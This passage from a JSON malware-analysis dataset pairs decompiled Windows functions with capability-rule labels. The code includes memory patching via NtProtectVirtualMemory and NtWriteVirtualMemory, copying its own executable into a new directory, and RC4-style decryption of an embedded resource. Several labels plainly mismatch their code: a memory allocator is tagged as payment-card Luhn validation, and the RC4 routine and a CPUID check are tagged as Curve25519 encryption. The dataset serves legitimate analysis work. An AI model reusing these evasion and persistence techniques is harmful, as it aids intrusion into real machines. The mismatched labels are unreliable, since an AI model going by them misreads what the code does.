       puStack1064 = &uStack1028;\n        (*_sym.imp.ntdll.dll_NtProtectVirtualMemory)(uVar9, &uStack1016, &uStack1024, 4);\n        puStack1064 = NULL;\n        (*_sym.imp.ntdll.dll_NtWriteVirtualMemory)(uVar9, uVar8, auStack1032, 1);\n        puStack1064 = &uStack1028;\n        (*_sym.imp.ntdll.dll_NtProtectVirtualMemory)(uVar9, &uStack1016, &uStack1024, uStack1028);\n    }\n    if (arg3 == 0) goto code_r0x000140002b52;\n    sub.VCRUNTIME140.dll_memset(&uStack312, 0, 0x104);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, &uStack312, 0x104);\n    uStack992 = 0;\n    uStack984 = 0xf;\n    appppuStack1008[0] = NULL;\n    do {\n        arg3_00 = arg3_00 + 1;\n    } while (*(&uStack312 + arg3_00) != '\\0');\n    fcn.140003190(appppuStack1008, &uStack312, arg3_00);\n    uVar13 = uStack984;\n    uVar12 = uStack992;\n    arg3_00 = appppuStack1008[0];\n    ppppuVar10 = appppuStack1008;\n    if (0xf < uStack984) {\n        ppppuVar10 = appppuStack1008[0];\n    }\n    if (7 < uStack992) {\n        for (iVar6 = sub.VCRUNTIME140.dll_memchr(ppppuVar10, 0x43, uStack992 - 7); iVar6 != 0;\n            iVar6 = sub.VCRUNTIME140.dll_memchr(iVar6 + 1, 0x43, ppppuVar10 + ((uVar12 - 7) - (iVar6 + 1)))) {\n            iVar4 = sub.VCRUNTIME140.dll_memcmp(iVar6, 0x1400012e0, 8);\n            if (iVar4 == 0) goto code_r0x000140002ae3;\n        }\n    }\ncode_r0x000140002aec:\n    (*_sym.imp.KERNEL32.dll_CreateDirectoryA)(0x1400012f0, 0);\n    (*_sym.imp.KERNEL32.dll_CopyFileA)(&uStack312, 0x1400012f8, 0);\n    fcn.140001d20();\ncode_r0x000140002b18:\n    if (0xf < uVar13) {\n        uVar12 = uVar13 + 1;\n        ppppuVar10 = arg3_00;\n        if (0xfff < uVar12) {\n            uVar12 = uVar13 + 0x28;\n            ppppuVar10 = arg3_00[-1];\n            if (0x1f < arg3_00 + (-8 - ppppuVar10)) {\n                (*_sym.imp.api_ms_win_crt_runtime_l1_1_0.dll__invalid_parameter_noinfo_noreturn)();\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\n        }\n        fcn.140003660(ppppuVar10, uVar12);\n    }\ncode_r0x000140002b52:\n    fcn.140003640(uStack40 ^ auStack1096);\n    return;\ncode_r0x000140002ae3:\n    if (iVar6 - ppppuVar10 == -1) goto code_r0x000140002aec;\n    goto code_r0x000140002b18;\n}\n",
        "token_count": 1947
    },
    "140002b8": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.140002b80(ulong noname_0, uint32_t *arg2)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint64_t *puVar4;\n    uint8_t *puVar5;\n    uint64_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    uint64_t uVar12;\n    uchar auStack728 [32];\n    uint64_t uStack696;\n    ulong uStack688;\n    uint uStack680;\n    uint uStack676;\n    uint uStack672;\n    uint uStack668;\n    uint uStack664;\n    uint uStack660;\n    uint uStack656;\n    uint uStack652;\n    uint uStack648;\n    uint uStack644;\n    uint uStack640;\n    uint uStack636;\n    uint uStack632;\n    uint uStack628;\n    uint uStack624;\n    uint uStack620;\n    uint uStack616;\n    uint uStack612;\n    uint uStack608;\n    uint uStack604;\n    uint uStack600;\n    uint uStack596;\n    uint uStack592;\n    uint uStack588;\n    uint uStack584;\n    uint uStack580;\n    uint uStack576;\n    uint uStack572;\n    uint64_t uStack568;\n    uint uStack560;\n    uint8_t auStack552 [256];\n    uint8_t auStack296 [256];\n    uint64_t uStack40;\n    \n    uStack40 = *0x140005030 ^ auStack728;\n    iVar3 = (*_sym.imp.KERNEL32.dll_FindResourceW)(0);\n    if ((((iVar3 != 0) && (iVar2 = (*_sym.imp.KERNEL32.dll_SizeofResource)(0, iVar3),  iVar2 != 0)) &&\n        (iVar3 = (*_sym.imp.KERNEL32.dll_LoadResource)(0, iVar3),  iVar3 != 0)) &&\n       (puVar4 = (*_sym.imp.KERNEL32.dll_LockResource)(),  puVar4 != NULL)) {\n        uStack696 = *puVar4;\n        uStack688 = puVar4[1];\n        uStack680 = *(puVar4 + 2);\n        uStack676 = *(puVar4 + 0x14);\n        uStack672 = *(puVar4 + 3);\n        uStack668 = *(puVar4 + 0x1c);\n        uStack664 = *(puVar4 + 4);\n        uStack660 = *(puVar4 + 0x24);\n        uStack656 = *(puVar4 + 5);\n        uStack652 = *(puVar4 + 0x2c);\n        uStack648 = *(puVar4 + 6);\n        uStack644 = *(puVar4 + 0x34);\n        uStack640 = *(puVar4 + 7);\n        uStack636 = *(puVar4 + 0x3c);\n        uStack632 = *(puVar4 + 8);\n        uStack628 = *(puVar4 + 0x44);\n        uStack624 = *(puVar4 + 9);\n        uStack620 = *(puVar4 + 0x4c);\n        uStack616 = *(puVar4 + 10);\n        uStack612 = *(puVar4 + 0x54);\n        uStack608 = *(puVar4 + 0xb);\n        uStack604 = *(puVar4 + 0x5c);\n        uStack600 = *(puVar4 + 0xc);\n        uStack596 = *(puVar4 + 100);\n        uStack592 = *(puVar4 + 0xd);\n        uStack588 = *(puVar4 + 0x6c);\n        uStack584 = *(puVar4 + 0xe);\n        uStack580 = *(puVar4 + 0x74);\n        uStack576 = *(puVar4 + 0xf);\n        uStack572 = *(puVar4 + 0x7c);\n        uStack568 = puVar4[0x10];\n        uStack560 = *(puVar4 + 0x11);\n        fcn.140002790(uStack696 & 0xffffffff, uStack696 >> 0x20, uStack688 & 0xffffffff);\n        *arg2 = iVar2 - 0x8cU;\n        puVar5 = fcn.1400036a4(iVar2 - 0x8cU);\n        sub.VCRUNTIME140.dll_memcpy(puVar5);\n        uVar7 = *arg2;\n        uVar12 = uVar7;\n        iVar3 = 0x100;\n        uVar6 = 0;\n        sub.VCRUNTIME140.dll_memset(auStack296);\n        sub.VCRUNTIME140.dll_memset();\n        uVar11 = uVar6;\n        do {\n            auStack552[uVar11] = uVar11;\n            uVar8 = uVar11 + 1;\n            auStack296[uVar11] = *(&uStack688 + (uVar11 & 0x7f) + 4);\n            uVar9 = uVar6;\n            uVar11 = uVar8;\n            uVar10 = uVar6;\n        } while (uVar8 < 0x100);\n        do {\n            uVar1 = auStack552[uVar9];\n            uVar8 = uVar10 + auStack296[uVar9] + uVar1 & 0x800000ff;\n            if (uVar8 < 0) {\n                uVar8 = (uVar8 - 1 | 0xffffff00) + 1;\n            }\n            auStack552[uVar9] = auStack552[uVar8];\n            auStack552[uVar8] = uVar1;\n            iVar3 = iVar3 + -1;\n            uVar9 = uVar9 + 1;\n            uVar10 = uVar8;\n        } while (iVar3 != 0);\n        uVar11 = uVar6;\n        if (uVar7 != 0) {\n            do {\n                uVar7 = uVar11 + 1U & 0x800000ff;\n                if (uVar7 < 0) {\n                    uVar7 = (uVar7 - 1 | 0xffffff00) + 1;\n                }\n                uVar11 = uVar7;\n                uVar1 = auStack552[uVar11];\n                uVar7 = uVar6 + uVar1 & 0x800000ff;\n                if (uVar7 < 0) {\n                    uVar7 = (uVar7 - 1 | 0xffffff00) + 1;\n                }\n                uVar6 = uVar7;\n                auStack552[uVar11] = auStack552[uVar7];\n                auStack552[uVar7] = uVar1;\n                *puVar5 = *puVar5 ^ auStack552[auStack552[uVar11] + uVar1 & 0xff];\n                puVar5 = puVar5 + 1;\n                uVar12 = uVar12 - 1;\n            } while (uVar12 != 0);\n        }\n    }\n    fcn.140003640(uStack40 ^ auStack728);\n    return;\n}\n",
        "token_count": 1615
    },
    "14000319": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nint64_t ** fcn.140003190(int64_t **arg1, ulong arg2, int64_t *arg3)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    code *pcVar3;\n    int64_t iVar4;\n    int64_t **ppiVar5;\n    int64_t *piVar6;\n    int64_t *piVar7;\n    int64_t *piVar8;\n    \n    piVar2 = arg1[3];\n    if (arg3 <= piVar2) {\n        ppiVar5 = arg1;\n        if (0xf < piVar2) {\n            ppiVar5 = *arg1;\n        }\n        arg1[2] = arg3;\n        sub.VCRUNTIME140.dll_memmove(ppiVar5);\n        *(ppiVar5 + arg3) = 0;\n        return arg1;\n    }\n    piVar8 = 0x7fffffffffffffff;\n    if (0x7fffffffffffffff < arg3) {\n        fcn.140001c80();\n        pcVar3 = swi(3);\n        ppiVar5 = (*pcVar3)();\n        return ppiVar5;\n    }\n    piVar6 = arg3 | 0xf;\n    if ((piVar6 < 0x8000000000000000) && (piVar2 <= 0x7fffffffffffffff - (piVar2 >> 1))) {\n        piVar1 = (piVar2 >> 1) + piVar2;\n        piVar8 = piVar6;\n        if (piVar6 < piVar1) {\n            piVar8 = piVar1;\n        }\n        piVar1 = piVar8 + 1;\n        if (0xfff < piVar1) {\n            piVar6 = piVar8 + 5;\n            if (piVar6 <= piVar1) {\n                fcn.140001be0();\n                pcVar3 = swi(3);\n                ppiVar5 = (*pcVar3)();\n                return ppiVar5;\n            }\n            goto code_r0x000140003241;\n        }\n        if (piVar1 == NULL) {\n            piVar6 = NULL;\n        }\n        else {\n            piVar6 = fcn.140003668(piVar1);\n        }\n    }\n    else {\n        piVar6 = 0x8000000000000027;\ncode_r0x000140003241:\n        iVar4 = fcn.140003668(piVar6);\n        if (iVar4 == 0) goto code_r0x0001400032de;\n        piVar6 = iVar4 + 0x27U & 0xffffffffffffffe0;\n        piVar6[-1] = iVar4;\n    }\n    arg1[2] = arg3;\n    arg1[3] = piVar8;\n    sub.VCRUNTIME140.dll_memcpy(piVar6, arg2, arg3);\n    *(piVar6 + arg3) = 0;\n    if (0xf < piVar2) {\n        piVar1 = *arg1;\n        piVar8 = piVar2 + 1;\n        piVar7 = piVar1;\n        if (0xfff < piVar8) {\n            piVar7 = piVar1[-1];\n            piVar8 = piVar2 + 5;\n            if (0x1f < piVar1 + (-8 - piVar7)) {\ncode_r0x0001400032de:\n                (*_sym.imp.api_ms_win_crt_runtime_l1_1_0.dll__invalid_parameter_noinfo_noreturn)();\n                pcVar3 = swi(3);\n                ppiVar5 = (*pcVar3)();\n                return ppiVar5;\n            }\n        }\n        fcn.140003660(piVar7, piVar8);\n    }\n    *arg1 = piVar6;\n    return arg1;\n}\n",
        "token_count": 846
    },
    "14000423": {
        "rules": [
            "encrypt data using Curve25519/bbf924b96e5b4ce780ce59f68f21b030"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0001400042fa)\n// WARNING: Removing unreachable block (ram,0x00014000426a)\n// WARNING: Removing unreachable block (ram,0x000140004243)\n\nulong fcn.140004230(ulong noname_0, ulong arg2)\n\n{\n    int32_t *piVar1;\n    uint32_t *puVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint8_t in_XCR0;\n    \n    piVar1 = cpuid_basic_info(0);\n    uVar6 = 0;\n    puVar2 = cpuid_Version_info(1);\n    uVar4 = puVar2[3];\n    if ((piVar1[2] ^ 0x49656e69U | piVar1[3] ^ 0x6c65746eU | piVar1[1] ^ 0x756e6547U) == 0) {\n        *0x140005060 = 0xffffffffffffffff;\n        uVar5 = *puVar2 & 0xfff3ff0;\n        *0x140005058 = 0x8000;\n        if ((((uVar5 == 0x106c0) || (uVar5 == 0x20660)) || (uVar5 == 0x20670)) ||\n           ((uVar5 - 0x30650 < 0x21 && ((0x100010001U >> (uVar5 - 0x30650 & 0x3f) & 1) != 0)))) {\n            *0x140005724 = *0x140005724 | 1;\n        }\n    }\n    if (6 < *piVar1) {\n        iVar3 = cpuid_Extended_Feature_Enumeration_info(7);\n        uVar6 = *(iVar3 + 4);\n        if ((uVar6 >> 9 & 1) != 0) {\n            *0x140005724 = *0x140005724 | 2;\n        }\n    }\n    *0x140005050 = 1;\n    *0x140005054 = 2;\n    if ((uVar4 >> 0x14 & 1) != 0) {\n        *0x140005050 = 2;\n        *0x140005054 = 6;\n        if ((((uVar4 >> 0x1b & 1) != 0) && ((uVar4 >> 0x1c & 1) != 0)) && ((in_XCR0 & 6) == 6)) {\n            *0x140005054 = 0xe;\n            *0x140005050 = 3;\n            if ((uVar6 & 0x20) != 0) {\n                *0x140005050 = 5;\n                *0x140005054 = 0x2e;\n                if (((uVar6 & 0xd0030000) == 0xd0030000) && ((in_XCR0 & 0xe0) == 0xe0)) {\n                    *0x140005054 = 0x6e;\n                    *0x140005050 = 6;\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 727
    },
    "140003b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.140003b80(ulong param_1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.140003b44(param_1);\n    return (iVar1 != 0) - 1;\n}\n",
        "token_count": 55
    },
    "14000366": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140003668(int64_t arg1)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    \n    do {\n        iVar2 = sub.api_ms_win_crt_heap_l1_1_0.dll_malloc(arg1);\n        if (iVar2 != 0) {\n            return;\n        }\n        iVar3 = sub.api_ms_win_crt_heap_l1_1_0.dll__callnewh(arg1);\n    } while (iVar3 != 0);\n    if (arg1 == -1) {\n        fcn.140001be0();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    fcn.140003e24();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 181
    },
    "1400041b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400041b8(void)\n\n{\n    int64_t *piVar1;\n    \n    for (piVar1 = 0x140001ab8; piVar1 < 0x140001ab8; piVar1 = piVar1 + 1) {\n        if (*piVar1 != 0) {\n            (**0x140007328)();\n        }\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "1400036a": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.1400036a4(int64_t arg1)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    \n    do {\n        iVar2 = sub.api_ms_win_crt_heap_l1_1_0.dll_malloc(arg1);\n        if (iVar2 != 0) {\n            return;\n        }\n        iVar3 = sub.api_ms_win_crt_heap_l1_1_0.dll__callnewh(arg1);\n    } while (iVar3 != 0);\n    if (arg1 == -1) {\n        fcn.140001be0();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    fcn.140003e24();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 183
    }
}